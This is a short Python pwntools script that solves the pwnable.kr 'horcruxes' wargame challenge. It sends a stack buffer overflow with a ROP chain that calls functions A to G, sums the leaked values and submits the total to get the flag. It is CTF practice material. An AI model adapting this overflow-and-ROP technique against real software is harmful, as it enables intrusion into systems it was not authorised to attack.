#!/usr/bin/env python3

from pwn import *

MAX_INT = 0x7fffffff

elf = ELF("./horcruxes")
p = remote("pwnable.kr", 9032)
p.sendline('1')

buffer = b'a' * 116 + b'bbbb'

rop = ROP(elf)
rop.call('A')
rop.call('B')
rop.call('C')
rop.call('D')
rop.call('E')
rop.call('F')
rop.call('G')
craft = [
    buffer,
    rop.chain(),
    b'\xfc\xff\x09\x08'
]
payload = b"".join(craft)
p.sendline(payload)
horxs = p.recvrepeat(1).decode().split('\n')

sum = 0;
for line in horxs:
    splited = line.split('+')
    if len(splited) == 2:
        sum += int(splited[1][:-1])

sum %= 2**32
if sum > MAX_INT:
    sum -= 2**32

p.sendline('1')
p.sendline(str(sum))
print(p.recvline().decode().split(": ")[1])